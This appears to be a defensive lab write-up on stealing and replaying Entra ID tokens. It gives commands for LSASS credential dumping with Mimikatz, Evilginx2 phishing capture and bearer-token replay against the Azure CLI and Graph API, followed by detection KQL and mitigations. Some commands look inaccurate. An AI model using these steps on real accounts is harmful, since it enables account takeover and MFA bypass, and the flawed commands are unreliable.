# Attack Scenario: Azure Token Theft & Replay
In Entra ID (Azure AD), access tokens, refresh tokens, and ID tokens grant access to services and APIs without resubmitting credentials. If an attacker steals a valid token (via memory dump, proxy, OAuth misconfig, or MITM), they can replay it to gain access — bypassing MFA if the token was already issued post-authentication.

## MITRE ATT&CK Techniques:
- T1550.001 – Use Alternate Authentication Material: Web Session Cookie
- T1528 – Abuse Access Tokens
- T1557 – Adversary-in-the-Middle

## Lab Environment
- **Azure-connected identity (hybrid or cloud-native)**
- **Entra ID user with MFA enabled**
- **User interacts with M365, Graph API, or Azure Portal**
- **Attacker can intercept or extract session material**
- **Tools:** TokenTactics, Evilginx2, Roadtools, Browser dev tools (manual), Azure CLI

## Objectives
- Extract or intercept valid tokens (access/refresh)
- Replay tokens to access Microsoft cloud services
- Persist access and pivot into higher privilege or data theft

## Execution Steps
### 1. Capture or Steal Tokens
#### a. From Device Memory
Using Mimikatz or LSASS dump:

```sekurlsa::logonpasswords```
Look for Bearer tokens or refresh tokens embedded in session processes.

#### b. From Evilginx2 Phishing
Evilginx2 captures tokens via reverse proxying Microsoft login:

```evilginx -p /path/to/config```
Tokens stored in:

~/.evilginx/session_tokens.json
#### c. From Browser
Via DevTools > Application > Cookies / LocalStorage:

```https://login.microsoftonline.com```

Look for access_token, id_token, or refresh_token entries

### 2. Decode the Token (Optional)
To validate token contents:

```jwt.io```
Or with Roadtools:

```roadrecon jwt <access_token>```

### 3. Replay Token with Azure CLI
To manually authenticate with a stolen token:

```az login --access-token <token>```

To access Graph API:

```curl -H "Authorization: Bearer <access_token>" https://graph.microsoft.com/v1.0/me```

To use with TokenTactics:

```tokenTactics.py --access-token <token> --resource graph```

## Detection Guidance
### Logs and Indicators
Sign-ins without credential prompt (sign-in logs missing Interactive auth type)
Access from unexpected IP or user agent
Sign-ins with “MFA satisfied” but no challenge
Multiple tokens issued in short bursts

### KQL – Suspicious Token Use Without MFA
```
SigninLogs
| where AuthenticationRequirement == "SingleFactorAuthentication"
| where DeviceDetail.browser != "ExpectedBrowser"
| where IPAddress !in (known corp IPs)
```

## Mitigations
- Shorten token lifetimes via Conditional Access policies
- Enable Continuous Access Evaluation (CAE)
- Use Conditional Access with token protection (Preview)
- Enforce sign-in frequency and reauth interval

Example: CAE Settings

```Entra ID > Security > Conditional Access > Token Protection (Preview)```
## References
- https://o365blog.com/post/token-theft
- https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/concept-continuous-access-evaluation
- https://docs.microsoft.com/en-us/azure/active-directory/develop/access-tokens
- https://attack.mitre.org/techniques/T1528/

## Navigation
[Back to Lab Index:](../../README.md)
